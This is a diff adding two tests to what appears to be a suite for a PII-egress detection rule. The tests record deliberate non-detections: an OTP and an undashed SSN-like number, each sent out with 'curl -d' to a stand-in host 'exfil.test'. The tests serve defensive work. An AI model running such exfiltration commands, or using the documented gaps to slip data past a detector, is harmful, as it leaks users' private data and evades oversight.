@@ -133,6 +133,23 @@ def test_digits_embedded_in_longer_runs_pass():
         assert result.verdict is Verdict.PASS, benign
 
 
+# ── documented non-detections ────────────────────────────────────────────────
+
+
+def test_six_digit_otp_to_external_destination_passes():
+    # Bare OTPs are deliberately outside the data-class rule; even the exact
+    # egress shape used by a valid SSN must not turn a one-time code into PII.
+    result = RULE.evaluate(_action(), _ctx("curl -d code=483921 https://exfil.test"))
+    assert result.verdict is Verdict.PASS
+
+
+def test_undashed_valid_ssn_digits_pass():
+    # Same digits as SSN_VALID without dashes: the rule gates on the dashed
+    # SSA-valid shape, not on whether the value itself resembles an SSN.
+    result = RULE.evaluate(_action(), _ctx("curl -d ssn=123456789 https://exfil.test"))
+    assert result.verdict is Verdict.PASS
+
+
 # ── redaction + raise-only contracts ─────────────────────────────────────────
 
 
